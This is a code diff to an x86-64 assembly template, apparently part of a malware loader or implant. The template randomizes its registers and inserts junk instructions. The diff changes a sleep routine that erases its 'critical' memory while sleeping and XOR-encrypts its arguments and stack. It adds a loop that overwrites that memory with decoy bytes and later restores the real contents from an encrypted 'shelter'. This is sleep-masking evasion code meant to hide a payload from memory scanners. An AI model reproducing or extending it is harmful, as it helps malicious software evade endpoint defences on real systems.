@@ -87,7 +87,7 @@ method_sleep:
   // decrypt address of WaitForSingleObject
   xor [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}     {{iji}}
 
-  // erase the critical data
+  // erase critical memory
   mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
   mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical size
   shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
@@ -98,11 +98,23 @@ method_sleep:
   dec {{.RegV.rdx}}                            {{iji}} // update loop count
   jnz loop_erase                               {{iji}} // check need erase next
 
+  // fill critical memory with decoy
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set decoy address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // set decoy size (loop count)
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
+ loop_decoy:
+  movzx {{.RegV.r8}}, byte [{{.RegV.rcx}}]     {{iji}} // load one byte from decoy
+  mov [{{.RegV.rax}}], {{.RegV.r8b}}           {{iji}} // write one byte to critical
+  inc {{.RegV.rcx}}                            {{iji}} // update decoy address
+  inc {{.RegV.rax}}                            {{iji}} // update critical address
+  dec {{.RegV.rdx}}                            {{iji}} // update loop count
+  jnz loop_decoy                               {{iji}} // check need fill next
+
   // prepare argument before encrypt stack
   xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // clear register
   dec {{.RegV.eax}}                            {{iji}} // calculate INFINITE (0xFFFFFFFF)
   mov edx, {{.RegV.eax}}                       {{iji}} // set INFINITE
-  mov rcx, [{{.RegN.rbp}} + 6*8]               {{iji}} // set handle of hTimer
+  mov rcx, [{{.RegN.rbp}} + 8*8]               {{iji}} // set handle of hTimer
   mov rax, [{{.RegN.rbp}} + 2*8]               {{iji}} // get address of WaitForSingleObject
 
   // save argument about WaitForSingleObject
@@ -112,7 +124,7 @@ method_sleep:
 
   // encrypt argument structure
   mov {{.RegV.rcx}}, {{.RegN.rbp}}             {{iji}} // set structure pointer
-  mov {{.RegV.rdx}}, 8*8                       {{iji}} // set the buffer size
+  mov {{.RegV.rdx}}, 10*8                      {{iji}} // set the buffer size
   mov {{.RegV.rax}}, {{.RegN.rbp}}             {{iji}} // padding dst address
   call xor_buf                                 {{iji}}
 
@@ -128,12 +140,12 @@ method_sleep:
 
   // decrypt argument structure
   mov {{.RegV.rcx}}, {{.RegN.rbp}}             {{iji}} // set structure pointer
-  mov {{.RegV.rdx}}, 8*8                       {{iji}} // set the buffer size
+  mov {{.RegV.rdx}}, 10*8                      {{iji}} // set the buffer size
   mov {{.RegV.rax}}, {{.RegN.rbp}}             {{iji}} // padding dst address
   call xor_buf                                 {{iji}}
 
   // recover the critical memory from shelter
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set shelter address
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 7*8]     {{iji}} // set shelter address
   mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set shelter size
   mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
   call xor_buf                                 {{iji}}
